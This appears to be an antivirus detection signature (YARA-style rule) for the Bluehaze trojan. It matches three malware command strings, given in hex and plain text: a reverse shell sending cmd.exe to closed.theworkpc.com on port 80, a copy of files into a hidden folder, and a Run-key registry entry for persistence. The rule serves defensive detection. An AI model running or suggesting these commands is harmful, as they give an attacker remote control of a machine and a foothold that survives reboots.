
rule Trojan_Win32_Bluehaze_SK_MTB{
	meta:
		description = "Trojan:Win32/Bluehaze.SK!MTB,SIGNATURE_TYPE_PEHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {63 6d 64 2e 65 78 65 20 2f 43 20 77 75 77 65 62 76 2e 65 78 65 20 2d 74 20 2d 65 20 63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32 5c 63 6d 64 2e 65 78 65 20 63 6c 6f 73 65 64 2e 74 68 65 77 6f 72 6b 70 63 2e 63 6f 6d 20 38 30 } //1 cmd.exe /C wuwebv.exe -t -e c:\windows\system32\cmd.exe closed.theworkpc.com 80
		$a_01_1 = {63 6d 64 2e 65 78 65 20 2f 63 20 63 6f 70 79 20 2a 2e 2a 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 4c 69 62 72 61 72 69 65 73 5c 43 4e 4e 55 44 54 56 5c } //1 cmd.exe /c copy *.* C:\Users\Public\Libraries\CNNUDTV\
		$a_01_2 = {63 6d 64 2e 65 78 65 20 2f 43 20 72 65 67 20 61 64 64 20 48 4b 43 55 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e 5c 52 75 6e 20 2f 76 20 41 43 4e 54 56 20 2f 74 20 52 45 47 5f 53 5a 20 2f 64 20 22 52 75 6e 64 6c 6c 33 32 2e 65 78 65 20 53 48 45 4c 4c 33 32 2e 44 4c 4c 2c 53 68 65 6c 6c 45 78 65 63 5f 52 75 6e 44 4c 4c 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 4c 69 62 72 61 72 69 65 73 5c 43 4e 4e 55 44 54 56 5c 44 61 74 65 43 68 65 63 6b 2e 65 78 65 22 22 20 2f 66 } //1 cmd.exe /C reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ACNTV /t REG_SZ /d "Rundll32.exe SHELL32.DLL,ShellExec_RunDLL "C:\Users\Public\Libraries\CNNUDTV\DateCheck.exe"" /f
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}